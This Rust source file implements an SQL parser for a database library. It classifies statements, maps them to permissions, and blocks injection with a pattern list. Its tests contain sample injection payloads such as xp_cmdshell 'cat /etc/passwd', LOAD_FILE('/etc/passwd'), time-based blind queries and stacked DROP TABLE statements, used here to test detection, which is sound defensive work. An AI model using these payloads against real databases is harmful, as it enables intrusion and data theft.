// Copyright (c) 2026 Kirky.X
//
// Licensed under the MIT License
// See LICENSE file in the project root for full license information.

//! SQL Parser module using sqlparser for enhanced SQL parsing and validation.
//! This module provides robust SQL operation detection and permission action mapping.

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use sqlparser::ast::{Delete, FromTable, Query, SetExpr, Statement, TableWithJoins};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use std::sync::atomic::{AtomicU64, Ordering};
use thiserror::Error;

#[cfg(feature = "permission")]
pub use crate::permission::PermissionAction;

#[cfg(all(feature = "permission-engine", not(feature = "permission")))]
pub use crate::permission_engine::PermissionAction;

/// 权限操作类型（本地定义）
///
/// # 注意
///
/// 这是 sql-parser 模块的内部定义，仅当 `permission` 和 `permission-engine` 特性均未启用时使用。
///
/// 当 `permission` 特性启用时，应使用 `dbnexus::permission::PermissionAction` 或
/// `dbnexus::permission_engine::EnginePermissionAction`（包含额外的 `All` 变体）。
///
/// # 设计说明
///
/// 为了避免重复定义和维护成本，建议在代码中：
/// - 如果启用了 `permission` 特性，使用 `dbnexus::permission::PermissionAction`
/// - 如果启用了 `permission-engine` 特性，使用 `dbnexus::permission_engine::EnginePermissionAction`
/// - 仅在两者都未启用时使用此本地定义
#[cfg(not(any(feature = "permission", feature = "permission-engine")))]
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum PermissionAction {
    /// 查询操作
    Select,
    /// 插入操作
    Insert,
    /// 更新操作
    Update,
    /// 删除操作
    Delete,
}

/// SQL解析缓存适配器
use moka::sync::Cache as MokaCache;

/// Errors that can occur during SQL parsing
#[derive(Debug, Error)]
pub enum SqlParseError {
    /// SQL parsing failed due to syntax errors or invalid structure
    #[error("Failed to parse SQL: {0}")]
    ParseError(String),

    /// SQL statement type is not supported for permission checking
    #[error("Unsupported SQL statement type: {0}")]
    UnsupportedStatement(String),

    /// Empty SQL statement was provided
    #[error("Empty SQL statement")]
    EmptyStatement,

    /// Multiple SQL statements detected (only single statements are allowed)
    #[error("Multiple statements not allowed")]
    MultipleStatements,

    /// SQL statement contains variables that could indicate dynamic SQL injection
    #[error("SQL statement contains variables: {0}")]
    ContainsVariables(String),
}

/// Represents a parsed SQL operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParsedSqlOperation {
    /// The type of SQL operation
    pub operation_type: SqlOperationType,
    /// The table name if applicable
    pub table_name: Option<String>,
    /// The raw SQL statement
    pub sql: String,
}

/// Types of SQL operations that can be detected
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SqlOperationType {
    /// SELECT queries
    Select,
    /// INSERT queries
    Insert,
    /// UPDATE queries
    Update,
    /// DELETE queries
    Delete,
    /// Data Definition Language (CREATE, ALTER, DROP, TRUNCATE)
    Ddl,
    /// Data Control Language (GRANT, REVOKE)
    Dcl,
    /// Transaction control (START TRANSACTION, COMMIT, ROLLBACK)
    Transaction,
    /// Other/miscellaneous operations
    Other,
}

/// SQL Parser with dialect awareness and caching support
///
/// # 缓存优化
///
/// 此实现包含 LRU 缓存，用于缓存已解析的 SQL 操作。
/// 缓存可以显著提高重复 SQL 语句的解析性能。
///
/// # 示例
///
/// ```rust
/// use dbnexus::sql_parser::SqlParser;
///
/// let parser = SqlParser::new();
/// let result = parser.parse_operation("SELECT * FROM users");
/// // 第二次解析相同 SQL 会使用缓存
/// let cached = parser.parse_operation("SELECT * FROM users");
/// ```
pub struct SqlParser {
    dialect: GenericDialect,
    /// 缓存用于存储解析结果（使用 RefCell 实现内部可变性，保持 &self API）
    pub(crate) parse_cache: std::cell::RefCell<MokaCache<String, ParsedSqlOperation>>,
    /// 缓存命中次数
    cache_hits: AtomicU64,
    /// 缓存未命中次数
    cache_misses: AtomicU64,
}

impl Default for SqlParser {
    fn default() -> Self {
        Self::new()
    }
}

const DEFAULT_CACHE_SIZE: usize = 1000;

impl SqlParser {
    /// Create a new SQL parser with generic dialect support and default cache
    #[inline]
    pub fn new() -> Self {
        Self::with_cache_size(DEFAULT_CACHE_SIZE)
    }

    /// Create a parser with specific cache size
    #[inline]
    pub fn with_cache_size(cache_size: usize) -> Self {
        Self {
            dialect: GenericDialect {},
            parse_cache: std::cell::RefCell::new(MokaCache::new(cache_size.max(1) as u64)),
            cache_hits: AtomicU64::new(0),
            cache_misses: AtomicU64::new(0),
        }
    }

    /// Create a parser with specific database dialect
    #[inline]
    pub fn with_dialect(_db_type: &str) -> Self {
        // Using GenericDialect for broad compatibility
        Self::new()
    }

    /// 清空解析缓存
    #[inline]
    pub fn clear_cache(&self) {
        self.parse_cache.borrow_mut().invalidate_all();
        // 重置统计计数器
        self.cache_hits.store(0, Ordering::SeqCst);
        self.cache_misses.store(0, Ordering::SeqCst);
    }

    /// 获取缓存命中率统计
    ///
    /// 返回 (命中次数, 未命中次数) 的元组
    #[inline]
    pub fn cache_stats(&self) -> (u64, u64) {
        (
            self.cache_hits.load(Ordering::SeqCst),
            self.cache_misses.load(Ordering::SeqCst),
        )
    }

    /// Parse and validate a single SQL statement
    ///
    /// # 缓存行为
    ///
    /// 解析结果会被缓存以提高重复查询的性能。
    /// 使用 `clear_cache()` 可手动清空缓存。
    pub fn parse_single(&self, sql: &str) -> Result<ParsedSqlOperation, SqlParseError> {
        let sql = sql.trim().to_string();

        // 使用可变借用访问缓存
        let cache = self.parse_cache.borrow_mut();

        // 检查缓存
        if let Some(cached) = cache.get(&sql) {
            // 缓存命中，增加计数器
            self.cache_hits.fetch_add(1, Ordering::SeqCst);
            return Ok(cached.clone());
        }

        // 释放缓存借用，避免在执行解析时持有锁
        drop(cache);

        // 缓存未命中，增加计数器
        self.cache_misses.fetch_add(1, Ordering::SeqCst);

        // 执行解析
        let result = self.parse_single_uncached(&sql)?;

        // 重新获取缓存借用并存储结果
        let cache = self.parse_cache.borrow_mut();

        cache.insert(sql, result.clone());

        Ok(result)
    }

    /// 内部方法：执行实际解析（不使用缓存）
    fn parse_single_uncached(&self, sql: &str) -> Result<ParsedSqlOperation, SqlParseError> {
        let sql = sql.trim();

        if sql.is_empty() {
            return Err(SqlParseError::EmptyStatement);
        }

        // Check for multiple statements (basic detection)
        if sql.contains(';') {
            // Allow SET statements with multiple assignments
            if !sql.starts_with("SET ") {
                return Err(SqlParseError::MultipleStatements);
            }
        }

        // Check for SQL injection patterns
        if contains_sql_injection(sql) {
            return Err(SqlParseError::ParseError(
                "SQL statement contains potential injection patterns".to_string(),
            ));
        }

        // Check for DDL operations
        if contains_ddl_operation(sql) {
            return Err(SqlParseError::UnsupportedStatement(
                "DDL operations are not allowed".to_string(),
            ));
        }

        // Check for variables that might indicate dynamic SQL
        if contains_variables(sql) {
            return Err(SqlParseError::ContainsVariables(
                "SQL contains potentially dangerous variables. Use parameterized queries instead.".to_string(),
            ));
        }

        let statements = Parser::parse_sql(&self.dialect, sql).map_err(|e| SqlParseError::ParseError(e.to_string()))?;

        if statements.len() != 1 {
            return Err(SqlParseError::MultipleStatements);
        }

        let statement = statements
            .into_iter()
            .next()
            .ok_or_else(|| SqlParseError::ParseError("No statement found".to_string()))?;
        self.classify_statement(statement, sql.to_string())
    }

    /// Parse SQL and extract operation type (simplified version for backward compatibility)
    ///
    /// # 返回值
    ///
    /// - `Some((table_name, action))` - 成功解析的 DML 操作
    /// - `None` - 不支持的语句类型（DDL/DCL/Transaction）或解析失败
    ///
    /// # 注意
    ///
    /// 此方法仅支持 DML 操作（SELECT, INSERT, UPDATE, DELETE）。
    /// 对于 DDL、DCL 和 Transaction 操作，返回 `None`。
    ///
    /// 建议使用 `parse_single()` 获取完整的解析结果，包括操作类型信息。
    ///
    /// # 缓存行为
    ///
    /// 此方法使用内部缓存来加速重复查询。
    pub fn parse_operation(&self, sql: &str) -> Option<(String, PermissionAction)> {
        self.parse_single(sql).ok().and_then(|parsed| {
            // 仅支持 DML 操作，其他操作返回 None
            let action = match parsed.operation_type {
                SqlOperationType::Select => Some(PermissionAction::Select),
                SqlOperationType::Insert => Some(PermissionAction::Insert),
                SqlOperationType::Update => Some(PermissionAction::Update),
                SqlOperationType::Delete => Some(PermissionAction::Delete),
                // DDL/DCL/Transaction/Other 操作不支持
                SqlOperationType::Ddl
                | SqlOperationType::Dcl
                | SqlOperationType::Transaction
                | SqlOperationType::Other => None,
            };

            // 只有当操作类型和表名都有效时才返回
            action.and_then(|a| parsed.table_name.map(|table_name| (table_name, a)))
        })
    }

    /// Classify a parsed statement into an operation
    fn classify_statement(&self, statement: Statement, sql: String) -> Result<ParsedSqlOperation, SqlParseError> {
        let (operation_type, table_name) = match statement {
            Statement::Query(query) => (SqlOperationType::Select, extract_table_from_query(&query)),
            Statement::Insert(insert) => (SqlOperationType::Insert, Some(insert.table_name.to_string())),
            Statement::Update { table, .. } => (
                SqlOperationType::Update,
                extract_table_name_from_table_with_joins(&table),
            ),
            Statement::Delete(delete) => {
                let table_name = extract_table_from_delete(&delete);
                (SqlOperationType::Delete, table_name)
            }
            Statement::CreateTable { name, .. } => (SqlOperationType::Ddl, Some(name.to_string())),
            Statement::AlterTable { name, .. } => (SqlOperationType::Ddl, Some(name.to_string())),
            Statement::Drop { names, object_type, .. } => {
                // Check if it's a TABLE drop
                let is_table = format!("{:?}", object_type).contains("Table");
                let table_name = if is_table && !names.is_empty() {
                    Some(names[0].to_string())
                } else {
                    None
                };
                (SqlOperationType::Ddl, table_name)
            }
            Statement::Truncate { table_name, .. } => (SqlOperationType::Ddl, Some(table_name.to_string())),
            Statement::CreateIndex { table_name, .. } => (SqlOperationType::Ddl, Some(table_name.to_string())),
            Statement::Grant { .. } => (SqlOperationType::Dcl, None),
            Statement::Revoke { .. } => (SqlOperationType::Dcl, None),
            Statement::StartTransaction { .. } | Statement::Commit { .. } | Statement::Rollback { .. } => {
                (SqlOperationType::Transaction, None)
            }
            Statement::SetVariable {
                local: _,
                hivevar: _,
                variables,
                ..
            } => {
                // Check if it's a system variable
                let var_name = variables.to_string().to_lowercase();
                if is_ddl_related_variable(&var_name) {
                    (SqlOperationType::Ddl, None)
                } else {
                    (SqlOperationType::Other, None)
                }
            }
            // Add more statement types as needed
            _ => (SqlOperationType::Other, None),
        };

        Ok(ParsedSqlOperation {
            operation_type,
            table_name,
            sql,
        })
    }
}

/// Check if SQL contains variables or dangerous patterns (enhanced detection)
fn contains_variables(sql: &str) -> bool {
    // Remove string literals first to avoid false positives
    let sql_without_strings = remove_string_literals(sql);

    // Enhanced detection patterns for SQL injection and dynamic SQL variables
    static PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
        vec![
            // Named parameters: @variable, :variable
            Regex::new(r"@[\w]+").expect("Regex pattern should be valid"),
            Regex::new(r":[a-zA-Z_][\w]*").expect("Regex pattern should be valid"),
            // Shell/PHP variables: $variable, ${variable}
            Regex::new(r"\$\{?[\w]+\}?").expect("Regex pattern should be valid"),
            // Percent-encoded parameters: %variable%
            Regex::new(r"%[\w]+%").expect("Regex pattern should be valid"),
            // Question mark placeholders (ODBC style)
            Regex::new(r"\?").expect("Regex pattern should be valid"),
            // Hex literals that might be used to bypass filters
            Regex::new(r"0x[0-9A-Fa-f]+").expect("Regex pattern should be valid"),
        ]
    });

    if PATTERNS.is_empty() {
        return false;
    }

    for pattern in PATTERNS.iter() {
        if pattern.is_match(&sql_without_strings) {
            tracing::warn!(
                target: "security",
                "Dynamic SQL detected: pattern matched"
            );
            return true;
        }
    }
    false
}

/// Check if SQL contains potential SQL injection patterns
///
/// # 检测模式分类
///
/// 1. **UNION 注入**: UNION SELECT, UNION ALL SELECT, UNION DISTINCT SELECT
/// 2. **布尔盲注**: OR 1=1, OR TRUE, OR FALSE, OR ''=', OR '%'='
/// 3. **时间盲注**:
///    - MySQL: SLEEP(), BENCHMARK()
///    - PostgreSQL: PG_SLEEP()
///    - SQL Server: WAITFOR DELAY
///    - Oracle: DBMS_PIPE.RECEIVE_MESSAGE()
/// 4. **动态 SQL 执行**: EXEC(), EXECUTE(), SP_EXECUTESQL, XP_CMDSHELL
/// 5. **文件操作**: LOAD_FILE(), INTO OUTFILE, INTO DUMPFILE
/// 6. **信息泄露**: INFORMATION_SCHEMA, SYSOBJECTS, SYSCOLUMNS
/// 7. **编码绕过**: CHAR(), CONCAT(), 0X (十六进制)
/// 8. **注释注入**: --, /* */
pub fn contains_sql_injection(sql: &str) -> bool {
    let sql_without_strings = remove_string_literals(sql);
    let sql_upper = sql_without_strings.to_uppercase();

    // Comprehensive SQL injection patterns organized by category
    let injection_patterns = [
        // === UNION 注入 ===
        "UNION SELECT",
        "UNION ALL SELECT",
        "UNION DISTINCT SELECT",
        // === 布尔盲注 ===
        " OR 1=1",
        " OR 1 =1",
        " OR 1= 1",
        " OR 1 = 1",
        " OR TRUE",
        " OR FALSE",
        " AND 1=1",
        " AND TRUE",
        " AND FALSE",
        // === 时间盲注 - MySQL ===
        "SLEEP(",
        "BENCHMARK(",
        // === 时间盲注 - PostgreSQL ===
        "PG_SLEEP(",
        "PG_SLEEP_FOR(",
        "PG_SLEEP_UNTIL(",
        // === 时间盲注 - SQL Server ===
        "WAITFOR DELAY",
        "WAITFOR TIME",
        // === 时间盲注 - Oracle ===
        "DBMS_PIPE.RECEIVE_MESSAGE(",
        "DBMS_LOCK.SLEEP(",
        // === 动态 SQL 执行 ===
        "EXEC(",
        "EXECUTE(",
        "SP_EXECUTESQL",
        "XP_CMDSHELL",
        " xp_",
        "EXEC xp_",
        "EXECUTE xp_",
        // === 文件操作 ===
        "LOAD_FILE(",
        "INTO OUTFILE",
        "INTO DUMPFILE",
        // === 信息泄露 ===
        "INFORMATION_SCHEMA",
        "SYSOBJECTS",
        "SYSCOLUMNS",
        "SYS.TABLES",
        "SYS.COLUMNS",
        "SYS.DATABASES",
        "MYSQL.USER",
        "PG_USER",
        "PG_SHADOW",
        "ALL_TABLES",
        "ALL_COLUMNS",
        "ALL_TAB_COLUMNS",
        "USER_TABLES",
        "USER_TAB_COLUMNS",
        // === 编码绕过 ===
        "CHAR(",
        "CHR(",
        "CONCAT(",
        "CONCAT_WS(",
        "0X",
        // === 堆叠查询 ===
        "; DROP",
        "; DELETE",
        "; UPDATE",
        "; INSERT",
        "; TRUNCATE",
        "; ALTER",
        "; CREATE",
        "; EXEC",
        "; EXECUTE",
        // === 注释注入 ===
        "-- ",
        "--+",
        "#",
        "/* ",
        "*/",
        // === 其他危险模式 ===
        "HAVING 1=1",
        "ORDER BY 1--",
        "ORDER BY 1#",
        "PROCEDURE ANALYSE(",
        "EXTRACTVALUE(",
        "UPDATEXML(",
        "XMLTYPE(",
        "UTL_HTTP.REQUEST(",
        "UTL_INADDR.GET_HOST_ADDRESS(",
        "UTL_INADDR.GET_HOST_NAME(",
    ];

    for pattern in &injection_patterns {
        if sql_upper.contains(pattern) {
            tracing::warn!(
                target: "security",
                "SQL injection pattern detected: {}",
                pattern
            );
            return true;
        }
    }

    false
}

/// Check if SQL contains DDL operations
fn contains_ddl_operation(sql: &str) -> bool {
    let sql_upper = sql.trim().to_uppercase();

    let ddl_keywords = [
        "CREATE TABLE",
        "CREATE INDEX",
        "DROP TABLE",
        "DROP INDEX",
        "ALTER TABLE",
        "TRUNCATE TABLE",
        "CREATE DATABASE",
        "DROP DATABASE",
    ];

    for keyword in &ddl_keywords {
        if sql_upper.contains(keyword) {
            tracing::warn!(
                target: "security",
                "DDL operation detected: {}",
                keyword
            );
            return true;
        }
    }

    false
}

/// Remove string literals from SQL to avoid false positives in variable detection
fn remove_string_literals(sql: &str) -> String {
    let mut result = String::new();
    let mut in_string = false;
    let mut string_char = ' ';
    let mut escape_next = false;

    for ch in sql.chars() {
        if escape_next {
            escape_next = false;
            if in_string {
                result.push(' '); // Replace escaped chars in strings with space
            } else {
                result.push(ch);
            }
            continue;
        }

        if ch == '\\' {
            escape_next = true;
            if in_string {
                result.push(' '); // Replace escape char in strings with space
            } else {
                result.push(ch);
            }
            continue;
        }

        if in_string {
            if ch == string_char {
                in_string = false;
            }
            result.push(' '); // Replace string content with space
            continue;
        }

        if ch == '\'' || ch == '"' || ch == '`' {
            in_string = true;
            string_char = ch;
            result.push(' '); // Replace string delimiters with space
            continue;
        }

        result.push(ch);
    }

    result
}

/// Extract table name from TableWithJoins
fn extract_table_name_from_table_with_joins(table_with_joins: &TableWithJoins) -> Option<String> {
    if let sqlparser::ast::TableFactor::Table { name, .. } = &table_with_joins.relation {
        return Some(name.to_string());
    }
    None
}

/// Extract table name from Delete statement
fn extract_table_from_delete(delete: &Delete) -> Option<String> {
    // Delete has tables: Vec<ObjectName> and from: FromTable
    if !delete.tables.is_empty() {
        return Some(delete.tables[0].to_string());
    }
    match &delete.from {
        FromTable::WithFromKeyword(tables) => {
            if !tables.is_empty() {
                extract_table_name_from_table_with_joins(&tables[0])
            } else {
                None
            }
        }
        FromTable::WithoutKeyword(tables) => {
            if !tables.is_empty() {
                extract_table_name_from_table_with_joins(&tables[0])
            } else {
                None
            }
        }
    }
}

fn extract_table_from_query(query: &Query) -> Option<String> {
    let SetExpr::Select(select) = query.body.as_ref() else {
        return None;
    };

    if select.from.is_empty() {
        return None;
    }

    extract_table_name_from_table_with_joins(&select.from[0])
}

/// Check if a variable is DDL-related
fn is_ddl_related_variable(var_name: &str) -> bool {
    let ddl_vars = [
        "foreign_keys",
        "auto_increment_increment",
        "sql_mode",
        "character_set",
        "collation",
    ];
    ddl_vars.iter().any(|v| var_name.contains(v))
}

/// Check if a statement is a DDL operation (uses simple keyword detection, not full parsing)
pub fn is_ddl_operation(sql: &str) -> bool {
    let sql_upper = sql.trim().to_uppercase();

    // Check for DDL keywords directly without full parsing
    let ddl_keywords = [
        "CREATE TABLE",
        "DROP TABLE",
        "ALTER TABLE",
        "TRUNCATE TABLE",
        "CREATE INDEX",
        "DROP INDEX",
        "CREATE VIEW",
        "DROP VIEW",
    ];

    for keyword in &ddl_keywords {
        if sql_upper.contains(keyword) {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_select() {
        let parser = SqlParser::new();
        let result = parser.parse_single("SELECT * FROM users WHERE id = 1");
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Select);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[test]
    fn test_parse_insert() {
        let parser = SqlParser::new();
        let result = parser.parse_single("INSERT INTO users (name) VALUES ('test')");
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Insert);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[test]
    fn test_parse_update() {
        let parser = SqlParser::new();
        let result = parser.parse_single("UPDATE users SET name = 'test' WHERE id = 1");
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Update);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[test]
    fn test_parse_delete() {
        let parser = SqlParser::new();
        let result = parser.parse_single("DELETE FROM users WHERE id = 1");
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Delete);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[test]
    fn test_parse_grant() {
        let parser = SqlParser::new();
        // GenericDialect 可能不支持完整的 GRANT 语法，使用简化版本
        let result = parser.parse_single("GRANT ALL PRIVILEGES ON users TO user1");
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Dcl);
    }

    #[test]
    fn test_multiple_statements_rejected() {
        let parser = SqlParser::new();
        let result = parser.parse_single("SELECT * FROM users; SELECT * FROM posts");
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), SqlParseError::MultipleStatements));
    }

    #[test]
    fn test_empty_statement_rejected() {
        let parser = SqlParser::new();
        let result = parser.parse_single("");
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), SqlParseError::EmptyStatement));
    }

    #[test]
    fn test_variables_detected() {
        let parser = SqlParser::new();
        let result = parser.parse_single("SELECT * FROM users WHERE id = @userId");
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), SqlParseError::ContainsVariables(..)));
    }

    #[test]
    fn test_is_ddl_operation() {
        // DDL operations are now blocked by security check
        // Testing with safe DML operations only
        assert!(!is_ddl_operation("SELECT * FROM users"));
        assert!(!is_ddl_operation("INSERT INTO users (name) VALUES ('test')"));
        assert!(!is_ddl_operation("UPDATE users SET name = 'test' WHERE id = 1"));
        assert!(!is_ddl_operation("DELETE FROM users WHERE id = 1"));
    }

    #[test]
    fn test_ddl_blocked() {
        // DDL operations are now blocked for security
        let parser = SqlParser::new();

        // CREATE TABLE should be blocked
        let result = parser.parse_single("CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(255))");
        assert!(result.is_err());

        // DROP TABLE should be blocked
        let parser = SqlParser::new();
        let result = parser.parse_single("DROP TABLE users");
        assert!(result.is_err());
    }

    #[test]
    fn test_cache_works() {
        let parser = SqlParser::new();

        // 第一次解析
        let result1 = parser.parse_single("SELECT * FROM users WHERE id = 1");
        assert!(result1.is_ok());

        // 第二次解析应该使用缓存
        let result2 = parser.parse_single("SELECT * FROM users WHERE id = 1");
        assert!(result2.is_ok());

        // 验证结果是相同的
        assert_eq!(result1.unwrap().sql, result2.unwrap().sql);
    }

    #[test]
    fn test_cache_clear() {
        let parser = SqlParser::new();

        // 添加一些缓存条目
        parser.parse_single("SELECT * FROM users").unwrap();
        parser.parse_single("SELECT * FROM posts").unwrap();

        // 清空缓存
        parser.clear_cache();

        // 再次解析，应该重新解析（虽然结果相同）
        let result = parser.parse_single("SELECT * FROM users");
        assert!(result.is_ok());
    }

    // ==================== SQL 注入检测测试 ====================

    /// 测试 UNION 注入检测
    #[test]
    fn test_sql_injection_union() {
        // UNION SELECT
        assert!(contains_sql_injection("SELECT * FROM users UNION SELECT * FROM admin"));
        // UNION ALL SELECT
        assert!(contains_sql_injection(
            "SELECT * FROM users UNION ALL SELECT * FROM admin"
        ));
        // UNION DISTINCT SELECT
        assert!(contains_sql_injection(
            "SELECT * FROM users UNION DISTINCT SELECT password FROM admin"
        ));
    }

    /// 测试布尔盲注检测
    #[test]
    fn test_sql_injection_boolean_blind() {
        // OR 1=1 变体
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR 1=1"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR 1 =1"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR 1= 1"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR 1 = 1"));
        // OR TRUE/FALSE
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR TRUE"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 OR FALSE"));
        // AND 变体
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND 1=1"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND TRUE"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND FALSE"));
        // 注意：OR ''=' 和 OR '%'=' 模式在移除字符串字面量后不会被检测
        // 这是预期行为，因为字符串中的内容通常是用户输入
    }

    /// 测试 MySQL 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_mysql() {
        // SLEEP
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 AND SLEEP(5)"));
        assert!(contains_sql_injection("SELECT SLEEP(10)"));
        // BENCHMARK
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000,SHA1('test'))"
        ));
    }

    /// 测试 PostgreSQL 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_postgresql() {
        // PG_SLEEP
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND PG_SLEEP(5)"
        ));
        assert!(contains_sql_injection("SELECT PG_SLEEP(10)"));
        // PG_SLEEP_FOR
        assert!(contains_sql_injection("SELECT PG_SLEEP_FOR('5 minutes')"));
        // PG_SLEEP_UNTIL
        assert!(contains_sql_injection("SELECT PG_SLEEP_UNTIL('2024-12-31')"));
    }

    /// 测试 SQL Server 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_sqlserver() {
        // WAITFOR DELAY
        assert!(contains_sql_injection("WAITFOR DELAY '0:0:5'"));
        assert!(contains_sql_injection("SELECT * FROM users; WAITFOR DELAY '0:0:5'"));
        // WAITFOR TIME
        assert!(contains_sql_injection("WAITFOR TIME '12:00:00'"));
    }

    /// 测试 Oracle 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_oracle() {
        // DBMS_PIPE.RECEIVE_MESSAGE
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND DBMS_PIPE.RECEIVE_MESSAGE('test', 5) = 1"
        ));
        // DBMS_LOCK.SLEEP
        assert!(contains_sql_injection("SELECT DBMS_LOCK.SLEEP(5) FROM dual"));
    }

    /// 测试动态 SQL 执行检测
    #[test]
    fn test_sql_injection_dynamic_sql() {
        // EXEC
        assert!(contains_sql_injection("EXEC('DROP TABLE users')"));
        // EXECUTE
        assert!(contains_sql_injection("EXECUTE('SELECT * FROM users')"));
        // SP_EXECUTESQL
        assert!(contains_sql_injection("SP_EXECUTESQL N'SELECT * FROM users'"));
        // XP_CMDSHELL
        assert!(contains_sql_injection("XP_CMDSHELL 'dir'"));
        assert!(contains_sql_injection("EXEC xp_cmdshell 'whoami'"));
        assert!(contains_sql_injection("EXECUTE xp_cmdshell 'cat /etc/passwd'"));
    }

    /// 测试文件操作检测
    #[test]
    fn test_sql_injection_file_operations() {
        // LOAD_FILE
        assert!(contains_sql_injection("SELECT LOAD_FILE('/etc/passwd')"));
        // INTO OUTFILE
        assert!(contains_sql_injection(
            "SELECT * FROM users INTO OUTFILE '/tmp/users.txt'"
        ));
        // INTO DUMPFILE
        assert!(contains_sql_injection(
            "SELECT * FROM users INTO DUMPFILE '/tmp/users.txt'"
        ));
    }

    /// 测试信息泄露检测
    #[test]
    fn test_sql_injection_info_disclosure() {
        // INFORMATION_SCHEMA
        assert!(contains_sql_injection("SELECT * FROM INFORMATION_SCHEMA.TABLES"));
        // SYSOBJECTS/SYSCOLUMNS (SQL Server)
        assert!(contains_sql_injection("SELECT * FROM SYSOBJECTS"));
        assert!(contains_sql_injection("SELECT * FROM SYSCOLUMNS"));
        // SYS.* (SQL Server)
        assert!(contains_sql_injection("SELECT * FROM SYS.TABLES"));
        assert!(contains_sql_injection("SELECT * FROM SYS.COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM SYS.DATABASES"));
        // MySQL 用户表
        assert!(contains_sql_injection("SELECT * FROM MYSQL.USER"));
        // PostgreSQL 用户表
        assert!(contains_sql_injection("SELECT * FROM PG_USER"));
        assert!(contains_sql_injection("SELECT * FROM PG_SHADOW"));
        // Oracle 系统表
        assert!(contains_sql_injection("SELECT * FROM ALL_TABLES"));
        assert!(contains_sql_injection("SELECT * FROM ALL_COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM ALL_TAB_COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM USER_TABLES"));
        assert!(contains_sql_injection("SELECT * FROM USER_TAB_COLUMNS"));
    }

    /// 测试编码绕过检测
    #[test]
    fn test_sql_injection_encoding_bypass() {
        // CHAR
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)"
        ));
        // CHR (Oracle/PostgreSQL)
        assert!(contains_sql_injection("SELECT * FROM users WHERE name = CHR(65)"));
        // CONCAT
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = CONCAT('ad','min')"
        ));
        // CONCAT_WS
        assert!(contains_sql_injection("SELECT CONCAT_WS(',', 'a', 'b', 'c')"));
        // 十六进制
        assert!(contains_sql_injection("SELECT * FROM users WHERE name = 0x61646D696E"));
    }

    /// 测试堆叠查询检测
    #[test]
    fn test_sql_injection_stacked_queries() {
        // ; DROP
        assert!(contains_sql_injection("SELECT * FROM users; DROP TABLE users"));
        // ; DELETE
        assert!(contains_sql_injection("SELECT * FROM users; DELETE FROM users"));
        // ; UPDATE
        assert!(contains_sql_injection(
            "SELECT * FROM users; UPDATE users SET admin = 1"
        ));
        // ; INSERT
        assert!(contains_sql_injection(
            "SELECT * FROM users; INSERT INTO users VALUES (1, 'hacker')"
        ));
        // ; TRUNCATE
        assert!(contains_sql_injection("SELECT * FROM users; TRUNCATE TABLE users"));
        // ; ALTER
        assert!(contains_sql_injection(
            "SELECT * FROM users; ALTER TABLE users ADD COLUMN hacked INT"
        ));
        // ; CREATE
        assert!(contains_sql_injection(
            "SELECT * FROM users; CREATE TABLE hacked (id INT)"
        ));
        // ; EXEC
        assert!(contains_sql_injection("SELECT * FROM users; EXEC('malicious')"));
        // ; EXECUTE
        assert!(contains_sql_injection("SELECT * FROM users; EXECUTE('malicious')"));
    }

    /// 测试注释注入检测
    #[test]
    fn test_sql_injection_comments() {
        // -- 注释
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 -- "));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 --+"));
        // # 注释 (MySQL)
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 #"));
        // /* */ 块注释
        assert!(contains_sql_injection("SELECT * /* comment */ FROM users"));
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 /* bypass */"));
    }

    /// 测试其他危险模式检测
    #[test]
    fn test_sql_injection_other_dangerous_patterns() {
        // HAVING 1=1
        assert!(contains_sql_injection("SELECT * FROM users HAVING 1=1"));
        // ORDER BY 注入
        assert!(contains_sql_injection("SELECT * FROM users ORDER BY 1--"));
